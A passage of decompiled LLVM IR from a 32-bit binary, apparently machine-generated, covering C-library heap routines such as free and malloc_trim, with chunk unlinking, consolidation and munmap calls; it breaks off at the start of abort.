dec_label_pc_8053428:                             ; preds = %dec_label_pc_8053423, %dec_label_pc_8053416, %dec_label_pc_80533eb, %dec_label_pc_80533d8
  %v0_8053428 = call i32 @abort()
  store i32 %v0_8053428, i32* %eax.global-to-local, align 4
  %v1_805342f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805342d

dec_label_pc_805342d:                             ; preds = %dec_label_pc_8053423, %dec_label_pc_8053428
  %v1_805342f = phi i32 [ %v3_8053416, %dec_label_pc_8053423 ], [ %v1_805342f.pre, %dec_label_pc_8053428 ]
  %v0_805342f = phi i32 [ %v3_8053419, %dec_label_pc_8053423 ], [ %v0_8053428, %dec_label_pc_8053428 ]
  %v0_805342d = load i32, i32* @edi, align 4
  %v1_805342d = load i32, i32* %ebp.global-to-local, align 4
  %v2_805342d = add i32 %v1_805342d, %v0_805342d
  store i32 %v2_805342d, i32* @edi, align 4
  %v2_805342f = add i32 %v1_805342f, 12
  %v3_805342f = inttoptr i32 %v2_805342f to i32*
  store i32 %v0_805342f, i32* %v3_805342f, align 4
  %v0_8053432 = load i32, i32* @edx, align 4
  %v1_8053432 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053432 = add i32 %v1_8053432, 8
  %v3_8053432 = inttoptr i32 %v2_8053432 to i32*
  store i32 %v0_8053432, i32* %v3_8053432, align 4
  br label %dec_label_pc_8053435

dec_label_pc_8053435:                             ; preds = %dec_label_pc_8053408, %dec_label_pc_805342d
  store i32 %v1_8053380, i32* %eax.global-to-local, align 4
  %v3_8053439 = load i32, i32* %v2_8053439, align 4
  store i32 %v3_8053439, i32* @edx, align 4
  %v0_805343c = load i32, i32* @ecx, align 4
  store i32 %v0_805343c, i32* %v2_8053439, align 4
  %v0_805343f = load i32, i32* @edi, align 4
  %v1_8053441 = or i32 %v0_805343f, 1
  %v1_8053444 = load i32, i32* @ecx, align 4
  %v2_8053444 = add i32 %v1_8053444, 4
  %v3_8053444 = inttoptr i32 %v2_8053444 to i32*
  store i32 %v1_8053441, i32* %v3_8053444, align 4
  %v0_8053447 = load i32, i32* @ecx, align 4
  %v1_8053447 = load i32, i32* @edx, align 4
  %v2_8053447 = add i32 %v1_8053447, 12
  %v3_8053447 = inttoptr i32 %v2_8053447 to i32*
  store i32 %v0_8053447, i32* %v3_8053447, align 4
  store i32 %v1_8053380, i32* %eax.global-to-local, align 4
  %v0_805344e = load i32, i32* @edx, align 4
  %v1_805344e = load i32, i32* @ecx, align 4
  %v2_805344e = add i32 %v1_805344e, 8
  %v3_805344e = inttoptr i32 %v2_805344e to i32*
  store i32 %v0_805344e, i32* %v3_805344e, align 4
  %v0_8053451 = load i32, i32* @edi, align 4
  %v1_8053451 = load i32, i32* @ecx, align 4
  %v3_8053451 = add i32 %v1_8053451, %v0_8053451
  %v4_8053451 = inttoptr i32 %v3_8053451 to i32*
  store i32 %v0_8053451, i32* %v4_8053451, align 4
  %v0_8053454 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053454 = load i32, i32* @ecx, align 4
  %v2_8053454 = add i32 %v1_8053454, 12
  %v3_8053454 = inttoptr i32 %v2_8053454 to i32*
  store i32 %v0_8053454, i32* %v3_8053454, align 4
  br label %dec_label_pc_8053469

dec_label_pc_8053459:                             ; preds = %dec_label_pc_80533f8
  %v0_8053459 = load i32, i32* @edi, align 4
  %v2_8053459 = add i32 %v0_8053459, %v1_8053400
  %v1_805345c = or i32 %v2_8053459, 1
  store i32 %v1_805345c, i32* %eax.global-to-local, align 4
  %v1_805345f = load i32, i32* @ecx, align 4
  %v2_805345f = add i32 %v1_805345f, 4
  %v3_805345f = inttoptr i32 %v2_805345f to i32*
  store i32 %v1_805345c, i32* %v3_805345f, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8053466 = load i32, i32* @ecx, align 4
  store i32 %v0_8053466, i32* %v3_8053466, align 4
  br label %dec_label_pc_8053469

dec_label_pc_8053469:                             ; preds = %dec_label_pc_8053435, %dec_label_pc_8053459
  store i32 %v3_80533bb, i32* @ecx, align 4
  %v1_805346d = icmp eq i32 %v3_80533bb, 0
  %v1_805346f = icmp eq i1 %v1_805346d, false
  br i1 %v1_805346f, label %dec_label_pc_80533bb, label %dec_label_pc_8053475

dec_label_pc_8053475:                             ; preds = %dec_label_pc_8053469, %dec_label_pc_80533a7
  store i32 %v4_805339f, i32* @ecx, align 4
  %v15_8053479 = icmp eq i32 %v0_80533b5, %v4_805339f
  br i1 %v15_8053479, label %dec_label_pc_80534fd, label %dec_label_pc_805347f

dec_label_pc_805347f:                             ; preds = %dec_label_pc_8053475
  %v4_805347f = add i32 %v0_80533b5, 4
  br label %dec_label_pc_80533a7

dec_label_pc_8053489:                             ; preds = %dec_label_pc_8053498.preheader, %dec_label_pc_8053489
  %v1_805348d20 = phi i32 [ 1, %dec_label_pc_8053498.preheader ], [ %v0_8053498.pre, %dec_label_pc_8053489 ]
  %v2_805348d = mul i32 %v1_805348d20, 8
  %v4_805348d = add i32 %v3_805348d, %v2_805348d
  store i32 %v4_805348d, i32* %eax.global-to-local, align 4
  %v1_8053491 = add i32 %v1_805348d20, 1
  store i32 %v1_8053491, i32* %edx.global-to-local, align 4
  %v2_8053492 = add i32 %v4_805348d, 12
  %v3_8053492 = inttoptr i32 %v2_8053492 to i32*
  store i32 %v4_805348d, i32* %v3_8053492, align 4
  %v0_8053495 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053495 = add i32 %v0_8053495, 8
  %v3_8053495 = inttoptr i32 %v2_8053495 to i32*
  store i32 %v0_8053495, i32* %v3_8053495, align 4
  %v0_8053498.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_805349b = icmp sgt i32 %v0_8053498.pre, 95
  br i1 %v7_805349b, label %dec_label_pc_805349d, label %dec_label_pc_8053489

dec_label_pc_805349d:                             ; preds = %dec_label_pc_8053489
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_80534a1 = add i32 %tmp11, 864
  %v2_80534a1 = inttoptr i32 %v1_80534a1 to i32*
  %v3_80534a1 = load i32, i32* %v2_80534a1, align 4
  %v4_80534a1 = or i32 %v3_80534a1, 1
  store i32 %v4_80534a1, i32* %v2_80534a1, align 4
  %v0_80534a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80534a8 = add i32 %v0_80534a8, 840
  %v2_80534a8 = inttoptr i32 %v1_80534a8 to i32*
  store i32 0, i32* %v2_80534a8, align 4
  %v0_80534b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80534b2 = add i32 %v0_80534b2, 852
  %v2_80534b2 = inttoptr i32 %v1_80534b2 to i32*
  store i32 65536, i32* %v2_80534b2, align 4
  %v0_80534bc = load i32, i32* %eax.global-to-local, align 4
  %v1_80534bc = add i32 %v0_80534bc, 844
  %v2_80534bc = inttoptr i32 %v1_80534bc to i32*
  store i32 262144, i32* %v2_80534bc, align 4
  %v0_80534c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80534c6 = add i32 %v0_80534c6, 836
  %v2_80534c6 = inttoptr i32 %v1_80534c6 to i32*
  store i32 262144, i32* %v2_80534c6, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_80534d7 = load i32, i32* %arg1, align 4
  %v1_80534d9 = urem i32 %v2_80534d7, 4
  %v1_80534dc = or i32 %v1_80534d9, 72
  store i32 %v1_80534dc, i32* %arg1, align 4
  %v0_80534e1 = load i32, i32* @edx, align 4
  %v1_80534e3 = add i32 %v0_80534e1, 52
  store i32 %v1_80534e3, i32* %eax.global-to-local, align 4
  %v2_80534e6 = add i32 %v0_80534e1, 44
  %v3_80534e6 = inttoptr i32 %v2_80534e6 to i32*
  store i32 %v1_80534e3, i32* %v3_80534e6, align 4
  %v1_80534eb = call i32 @sysconf(i32 30)
  store i32 %v1_80534eb, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_80534f7 = add i32 %tmp11, 860
  %v3_80534f7 = inttoptr i32 %v2_80534f7 to i32*
  store i32 %v1_80534eb, i32* %v3_80534f7, align 4
  br label %dec_label_pc_80534fd

dec_label_pc_80534fd:                             ; preds = %dec_label_pc_8053475, %dec_label_pc_805349d
  store i32 %v0_8053360, i32* @ebx, align 4
  store i32 %v0_805335f, i32* @esi, align 4
  store i32 %v0_805335e, i32* @edi, align 4
  %v0_8053504 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053504

; uselistorder directives
  uselistorder i32 %v0_8053495, { 1, 0 }
  uselistorder i32 %v0_8053451, { 1, 0 }
  uselistorder i32 %v1_805340f, { 1, 0 }
  uselistorder i32 %v2_8053408, { 1, 0 }
  uselistorder i32 %v1_8053400, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805340c, { 1, 0 }
  uselistorder i32 %v3_80533bb, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80533d8, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80533b5, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8053466, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_80534fd, { 1, 0 }
  uselistorder label %dec_label_pc_8053489, { 1, 0 }
  uselistorder label %dec_label_pc_8053469, { 1, 0 }
  uselistorder label %dec_label_pc_8053435, { 1, 0 }
  uselistorder label %dec_label_pc_805342d, { 1, 0 }
  uselistorder label %dec_label_pc_80533f8, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053505 = load i32, i32* @ebp, align 4
  %v0_8053506 = load i32, i32* @edi, align 4
  %v0_8053507 = load i32, i32* @esi, align 4
  %v0_8053508 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8053510 = icmp eq i32 %arg1, 0
  br i1 %v1_8053510, label %dec_label_pc_8053699, label %dec_label_pc_8053518

dec_label_pc_8053518:                             ; preds = %entry
  %v2_8053523 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053523, i32* @eax, align 4
  %v2_8053528 = call i32 @__pthread_return_void(i32 %v2_8053523, i32 134562299)
  store i32 %v2_8053528, i32* %eax.global-to-local, align 4
  %v1_8053534 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062430.730 to i32))
  %v1_8053539 = add i32 %arg1, -8
  store i32 %v1_8053539, i32* @ecx, align 4
  %v0_805353c = load i8, i8* @global_var_80688a0.731, align 1
  %v1_805353c = sext i8 %v0_805353c to i32
  store i32 %v1_805353c, i32* %eax.global-to-local, align 4
  %v1_8053541 = add i32 %arg1, -4
  %v2_8053541 = inttoptr i32 %v1_8053541 to i32*
  %v3_8053541 = load i32, i32* %v2_8053541, align 4
  store i32 %v3_8053541, i32* @edx, align 4
  %v1_8053549 = and i32 %v3_8053541, -4
  %v4_8053549 = trunc i32 %v1_8053549 to i8
  store i32 %v1_8053549, i32* @ebx, align 4
  %v8_805354e = icmp ugt i8 %v4_8053549, %v0_805353c
  br i1 %v8_805354e, label %dec_label_pc_8053570, label %dec_label_pc_8053550

dec_label_pc_8053550:                             ; preds = %dec_label_pc_8053518
  %v1_8053550 = or i32 %v1_805353c, 3
  %v3_8053550 = trunc i32 %v1_8053550 to i8
  store i32 %v1_8053550, i32* %eax.global-to-local, align 4
  %v2_8053553 = udiv i32 %v3_8053541, 8
  store i8 %v3_8053550, i8* @global_var_80688a0.731, align 32
  %v1_805355b = mul nuw i32 %v2_8053553, 4
  %v2_805355b = add i32 %v1_805355b, ptrtoint (i8* @global_var_80688a0.731 to i32)
  store i32 %v2_805355b, i32* @edx, align 4
  %v1_8053562 = add i32 %v1_805355b, add (i32 ptrtoint (i8* @global_var_80688a0.731 to i32), i32 -4)
  %v2_8053562 = inttoptr i32 %v1_8053562 to i32*
  %v3_8053562 = load i32, i32* %v2_8053562, align 4
  store i32 %v3_8053562, i32* %eax.global-to-local, align 4
  %v3_8053565 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8053562, i32* %v3_8053565, align 4
  %v0_8053568 = load i32, i32* @ecx, align 4
  %v1_8053568 = load i32, i32* @edx, align 4
  %v2_8053568 = add i32 %v1_8053568, -4
  %v3_8053568 = inttoptr i32 %v2_8053568 to i32*
  store i32 %v0_8053568, i32* %v3_8053568, align 4
  br label %dec_label_pc_8053688

dec_label_pc_8053570:                             ; preds = %dec_label_pc_8053518
  %v2_8053570 = and i32 %v3_8053541, 2
  %v3_8053570 = icmp eq i32 %v2_8053570, 0
  %v1_8053573 = icmp eq i1 %v3_8053570, false
  br i1 %v1_8053573, label %dec_label_pc_8053668, label %dec_label_pc_8053579

dec_label_pc_8053579:                             ; preds = %dec_label_pc_8053570
  %v1_8053579 = or i32 %v1_805353c, 1
  %v3_8053579 = trunc i32 %v1_8053579 to i8
  store i32 %v1_8053579, i32* %eax.global-to-local, align 4
  store i8 %v3_8053579, i8* @global_var_80688a0.731, align 32
  %v2_8053581 = add i32 %v1_8053549, %v1_8053539
  store i32 %v2_8053581, i32* @esi, align 4
  %v1_8053584 = add i32 %v2_8053581, 4
  %v2_8053584 = inttoptr i32 %v1_8053584 to i32*
  %v3_8053584 = load i32, i32* %v2_8053584, align 4
  store i32 %v3_8053584, i32* %eax.global-to-local, align 4
  %v2_805358b = inttoptr i32 %v1_8053541 to i8*
  %v3_805358b = load i8, i8* %v2_805358b, align 1
  %v4_805358b = urem i8 %v3_805358b, 2
  %v5_805358b = icmp eq i8 %v4_805358b, 0
  %v1_805358f = icmp eq i1 %v5_805358b, false
  br i1 %v1_805358f, label %dec_label_pc_80535b2, label %dec_label_pc_8053591

dec_label_pc_8053591:                             ; preds = %dec_label_pc_8053579
  %v2_8053591 = inttoptr i32 %v1_8053539 to i32*
  %v3_8053591 = load i32, i32* %v2_8053591, align 4
  store i32 %v3_8053591, i32* @ebp, align 4
  %v2_8053596 = sub i32 %v1_8053539, %v3_8053591
  store i32 %v2_8053596, i32* %eax.global-to-local, align 4
  %v1_8053598 = add i32 %v2_8053596, 8
  %v2_8053598 = inttoptr i32 %v1_8053598 to i32*
  %v3_8053598 = load i32, i32* %v2_8053598, align 4
  store i32 %v3_8053598, i32* @edi, align 4
  %v1_805359b = add i32 %v2_8053596, 12
  %v2_805359b = inttoptr i32 %v1_805359b to i32*
  %v3_805359b = load i32, i32* %v2_805359b, align 4
  store i32 %v3_805359b, i32* @edx, align 4
  %v1_805359e = add i32 %v3_8053598, 12
  %v2_805359e = inttoptr i32 %v1_805359e to i32*
  %v3_805359e = load i32, i32* %v2_805359e, align 4
  store i32 %v3_805359e, i32* @ecx, align 4
  %v12_80535a1 = icmp eq i32 %v3_805359e, %v2_8053596
  %v1_80535a3 = icmp eq i1 %v12_80535a1, false
  br i1 %v1_80535a3, label %dec_label_pc_80535e1, label %dec_label_pc_80535a5

dec_label_pc_80535a5:                             ; preds = %dec_label_pc_8053591
  %v1_80535a5 = add i32 %v3_805359b, 8
  %v2_80535a5 = inttoptr i32 %v1_80535a5 to i32*
  %v3_80535a5 = load i32, i32* %v2_80535a5, align 4
  %v15_80535a5 = icmp eq i32 %v3_80535a5, %v3_805359e
  %v1_80535a8 = icmp eq i1 %v15_80535a5, false
  br i1 %v1_80535a8, label %dec_label_pc_80535e1, label %dec_label_pc_80535aa

dec_label_pc_80535aa:                             ; preds = %dec_label_pc_80535a5
  %v2_80535aa = add i32 %v3_8053591, %v1_8053549
  store i32 %v2_80535aa, i32* @ebx, align 4
  store i32 %v3_805359b, i32* %v2_805359e, align 4
  %v0_80535af = load i32, i32* @edi, align 4
  %v1_80535af = load i32, i32* @edx, align 4
  %v2_80535af = add i32 %v1_80535af, 8
  %v3_80535af = inttoptr i32 %v2_80535af to i32*
  store i32 %v0_80535af, i32* %v3_80535af, align 4
  %v0_80535b9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80535b2

dec_label_pc_80535b2:                             ; preds = %dec_label_pc_8053579, %dec_label_pc_80535aa
  %v1_80535c5 = phi i32 [ %v2_8053581, %dec_label_pc_8053579 ], [ %v0_80535b9.pre, %dec_label_pc_80535aa ]
  %v1_80535b6 = and i32 %v3_8053584, -4
  store i32 %v1_80535b6, i32* @ebp, align 4
  %v1_80535b9 = load i32, i32* @global_var_80688cc.732, align 4
  %v12_80535b9 = icmp eq i32 %v1_80535c5, %v1_80535b9
  br i1 %v12_80535b9, label %dec_label_pc_8053613, label %dec_label_pc_80535c1

dec_label_pc_80535c1:                             ; preds = %dec_label_pc_80535b2
  %v2_80535c1 = add i32 %v1_80535c5, 4
  %v3_80535c1 = add i32 %v2_80535c1, %v1_80535b6
  %v4_80535c1 = inttoptr i32 %v3_80535c1 to i32*
  %v5_80535c1 = load i32, i32* %v4_80535c1, align 4
  store i32 %v5_80535c1, i32* %eax.global-to-local, align 4
  %v3_80535c5 = inttoptr i32 %v2_80535c1 to i32*
  store i32 %v1_80535b6, i32* %v3_80535c5, align 4
  %v0_80535c8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80535c8 = urem i32 %v0_80535c8, 2
  %v2_80535c8 = icmp eq i32 %v1_80535c8, 0
  store i32 %v1_80535c8, i32* %eax.global-to-local, align 4
  %v1_80535cd = icmp eq i1 %v2_80535c8, false
  br i1 %v1_80535cd, label %dec_label_pc_80535ee, label %dec_label_pc_80535cf

dec_label_pc_80535cf:                             ; preds = %dec_label_pc_80535c1
  %v0_80535cf = load i32, i32* @esi, align 4
  %v1_80535cf = add i32 %v0_80535cf, 8
  %v2_80535cf = inttoptr i32 %v1_80535cf to i32*
  %v3_80535cf = load i32, i32* %v2_80535cf, align 4
  store i32 %v3_80535cf, i32* @edx, align 4
  %v1_80535d2 = add i32 %v0_80535cf, 12
  %v2_80535d2 = inttoptr i32 %v1_80535d2 to i32*
  %v3_80535d2 = load i32, i32* %v2_80535d2, align 4
  store i32 %v3_80535d2, i32* %eax.global-to-local, align 4
  %v1_80535d5 = add i32 %v3_80535cf, 12
  %v2_80535d5 = inttoptr i32 %v1_80535d5 to i32*
  %v3_80535d5 = load i32, i32* %v2_80535d5, align 4
  store i32 %v3_80535d5, i32* @edi, align 4
  %v12_80535d8 = icmp eq i32 %v3_80535d5, %v0_80535cf
  %v1_80535da = icmp eq i1 %v12_80535d8, false
  br i1 %v1_80535da, label %dec_label_pc_80535e1, label %dec_label_pc_80535dc

dec_label_pc_80535dc:                             ; preds = %dec_label_pc_80535cf
  %v1_80535dc = add i32 %v3_80535d2, 8
  %v2_80535dc = inttoptr i32 %v1_80535dc to i32*
  %v3_80535dc = load i32, i32* %v2_80535dc, align 4
  %v15_80535dc = icmp eq i32 %v3_80535dc, %v3_80535d5
  br i1 %v15_80535dc, label %dec_label_pc_80535e6, label %dec_label_pc_80535e1

dec_label_pc_80535e1:                             ; preds = %dec_label_pc_80535dc, %dec_label_pc_80535cf, %dec_label_pc_80535a5, %dec_label_pc_8053591
  %v0_80535e1 = call i32 @abort()
  store i32 %v0_80535e1, i32* %eax.global-to-local, align 4
  %v1_80535e6.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80535e6

dec_label_pc_80535e6:                             ; preds = %dec_label_pc_80535dc, %dec_label_pc_80535e1
  %v1_80535e6 = phi i32 [ %v3_80535cf, %dec_label_pc_80535dc ], [ %v1_80535e6.pre, %dec_label_pc_80535e1 ]
  %v0_80535e6 = phi i32 [ %v3_80535d2, %dec_label_pc_80535dc ], [ %v0_80535e1, %dec_label_pc_80535e1 ]
  %v2_80535e6 = add i32 %v1_80535e6, 12
  %v3_80535e6 = inttoptr i32 %v2_80535e6 to i32*
  store i32 %v0_80535e6, i32* %v3_80535e6, align 4
  %v0_80535e9 = load i32, i32* @ebx, align 4
  %v1_80535e9 = load i32, i32* @ebp, align 4
  %v2_80535e9 = add i32 %v1_80535e9, %v0_80535e9
  store i32 %v2_80535e9, i32* @ebx, align 4
  %v0_80535eb = load i32, i32* @edx, align 4
  %v1_80535eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80535eb = add i32 %v1_80535eb, 8
  %v3_80535eb = inttoptr i32 %v2_80535eb to i32*
  store i32 %v0_80535eb, i32* %v3_80535eb, align 4
  br label %dec_label_pc_80535ee

dec_label_pc_80535ee:                             ; preds = %dec_label_pc_80535c1, %dec_label_pc_80535e6
  %v0_80535ee = load i32, i32* @global_var_80688dc.750, align 4
  store i32 %v0_80535ee, i32* %eax.global-to-local, align 4
  %v0_80535f3 = load i32, i32* @ecx, align 4
  %v1_80535f3 = add i32 %v0_80535f3, 12
  %v2_80535f3 = inttoptr i32 %v1_80535f3 to i32*
  store i32 ptrtoint (i32* @global_var_80688d4.734 to i32), i32* %v2_80535f3, align 4
  %v0_80535fa = load i32, i32* @ebx, align 4
  %v1_80535fa = load i32, i32* @ecx, align 4
  %v3_80535fa = add i32 %v1_80535fa, %v0_80535fa
  %v4_80535fa = inttoptr i32 %v3_80535fa to i32*
  store i32 %v0_80535fa, i32* %v4_80535fa, align 4
  %v0_80535fd = load i32, i32* %eax.global-to-local, align 4
  %v1_80535fd = load i32, i32* @ecx, align 4
  %v2_80535fd = add i32 %v1_80535fd, 8
  %v3_80535fd = inttoptr i32 %v2_80535fd to i32*
  store i32 %v0_80535fd, i32* %v3_80535fd, align 4
  %v0_8053600 = load i32, i32* @ecx, align 4
  %v1_8053600 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053600 = add i32 %v1_8053600, 12
  %v3_8053600 = inttoptr i32 %v2_8053600 to i32*
  store i32 %v0_8053600, i32* %v3_8053600, align 4
  %v0_8053603 = load i32, i32* @ebx, align 4
  %v1_8053605 = or i32 %v0_8053603, 1
  store i32 %v1_8053605, i32* %eax.global-to-local, align 4
  %v0_8053608 = load i32, i32* @ecx, align 4
  store i32 %v0_8053608, i32* @global_var_80688dc.750, align 4
  %v2_805360e = add i32 %v0_8053608, 4
  %v3_805360e = inttoptr i32 %v2_805360e to i32*
  store i32 %v1_8053605, i32* %v3_805360e, align 4
  br label %dec_label_pc_8053623

dec_label_pc_8053613:                             ; preds = %dec_label_pc_80535b2
  %v0_8053613 = load i32, i32* @ebx, align 4
  %v2_8053613 = add i32 %v0_8053613, %v1_80535b6
  store i32 %v2_8053613, i32* @ebx, align 4
  %v1_8053617 = or i32 %v2_8053613, 1
  store i32 %v1_8053617, i32* %eax.global-to-local, align 4
  %v1_805361a = load i32, i32* @ecx, align 4
  %v2_805361a = add i32 %v1_805361a, 4
  %v3_805361a = inttoptr i32 %v2_805361a to i32*
  store i32 %v1_8053617, i32* %v3_805361a, align 4
  %v0_805361d = load i32, i32* @ecx, align 4
  store i32 %v0_805361d, i32* @global_var_80688cc.732, align 4
  br label %dec_label_pc_8053623

dec_label_pc_8053623:                             ; preds = %dec_label_pc_80535ee, %dec_label_pc_8053613
  %v0_8053623 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8053623, 131072
  br i1 %tmp, label %dec_label_pc_8053688, label %dec_label_pc_805362b

dec_label_pc_805362b:                             ; preds = %dec_label_pc_8053623
  %v0_805362b = load i8, i8* @global_var_80688a0.731, align 32
  %v1_805362b = and i8 %v0_805362b, 2
  %v2_805362b = icmp eq i8 %v1_805362b, 0
  br i1 %v2_805362b, label %dec_label_pc_8053644, label %dec_label_pc_8053634

dec_label_pc_8053634:                             ; preds = %dec_label_pc_805362b
  %v2_805363c = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80688a0.731 to i32*))
  store i32 %v2_805363c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053644

dec_label_pc_8053644:                             ; preds = %dec_label_pc_805362b, %dec_label_pc_8053634
  %v0_8053644 = load i32, i32* @global_var_80688cc.732, align 4
  store i32 %v0_8053644, i32* %eax.global-to-local, align 4
  %v1_8053649 = add i32 %v0_8053644, 4
  %v2_8053649 = inttoptr i32 %v1_8053649 to i32*
  %v3_8053649 = load i32, i32* %v2_8053649, align 4
  %v1_805364c = and i32 %v3_8053649, -4
  store i32 %v1_805364c, i32* %eax.global-to-local, align 4
  %v1_805364f = load i32, i32* @global_var_8068be4.748, align 4
  %v7_805364f = icmp ult i32 %v1_805364c, %v1_805364f
  br i1 %v7_805364f, label %dec_label_pc_8053688, label %dec_label_pc_8053657

dec_label_pc_8053657:                             ; preds = %dec_label_pc_8053644
  %v0_8053657 = load i32, i32* @global_var_8068be8.746, align 8
  store i32 %v0_8053657, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_80688a0.731 to i32), i32* @edx, align 4
  %v0_8053661 = call i32 @__malloc_trim()
  store i32 %v0_8053661, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053688

dec_label_pc_8053668:                             ; preds = %dec_label_pc_8053570
  %v2_8053668 = inttoptr i32 %v1_8053539 to i32*
  %v3_8053668 = load i32, i32* %v2_8053668, align 4
  %v0_805366b = load i32, i32* @global_var_8068bf0.739, align 16
  %v1_805366b = add i32 %v0_805366b, -1
  store i32 %v1_805366b, i32* @global_var_8068bf0.739, align 16
  %v2_8053671 = add i32 %v3_8053668, %v1_8053549
  store i32 %v2_8053671, i32* %eax.global-to-local, align 4
  %v2_8053674 = sub i32 %v1_8053539, %v3_8053668
  %v0_805367a = load i32, i32* @global_var_8068c04.743, align 4
  %v2_805367a = sub i32 %v0_805367a, %v2_8053671
  store i32 %v2_805367a, i32* @global_var_8068c04.743, align 4
  %v4_8053680 = call i32 @munmap(i32 %v2_8053674, i32 %v2_8053671, i32 %v1_8053549, i32 %v1_8053549)
  store i32 %v4_8053680, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053688

dec_label_pc_8053688:                             ; preds = %dec_label_pc_8053644, %dec_label_pc_8053623, %dec_label_pc_8053657, %dec_label_pc_8053550, %dec_label_pc_8053668
  store i32 %v2_8053523, i32* @eax, align 4
  %v2_8053691 = call i32 @__pthread_return_void(i32 %v2_8053523, i32 1)
  store i32 %v2_8053691, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053699

dec_label_pc_8053699:                             ; preds = %entry, %dec_label_pc_8053688
  %.0 = phi i32 [ undef, %entry ], [ %v2_8053691, %dec_label_pc_8053688 ]
  store i32 %v0_8053508, i32* @ebx, align 4
  store i32 %v0_8053507, i32* @esi, align 4
  store i32 %v0_8053506, i32* @edi, align 4
  store i32 %v0_8053505, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8053668, { 1, 0 }
  uselistorder i32 %v0_80535fa, { 1, 0 }
  uselistorder i32 %v1_80535c8, { 1, 0 }
  uselistorder i32 %v2_80535c1, { 1, 0 }
  uselistorder i32 %v1_80535b6, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80535c5, { 1, 0 }
  uselistorder i32 %v1_8053549, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8053541, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8053539, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 undef, { 1, 0 }
  uselistorder i32* bitcast (i8* @global_var_80688a0.731 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80688d4.734 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_80688cc.732, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8062430.730 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_8053699, { 1, 0 }
  uselistorder label %dec_label_pc_8053688, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053644, { 1, 0 }
  uselistorder label %dec_label_pc_8053623, { 1, 0 }
  uselistorder label %dec_label_pc_80535ee, { 1, 0 }
  uselistorder label %dec_label_pc_80535e6, { 1, 0 }
  uselistorder label %dec_label_pc_80535b2, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80536a1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80536ae = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_80688a0.731 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_80688a0.731 to i32), i32* @edx, align 4
  %v0_80536bb = load i32, i32* @ebx, align 4
  store i32 %v0_80536bb, i32* @eax, align 4
  store i32 %v0_80536a1, i32* @ebx, align 4
  %v0_80536be = call i32 @__malloc_trim()
  ret i32 %v0_80536be

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_80688a0.731 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_80688a0.731, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_80536d0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062448.751 to i32))
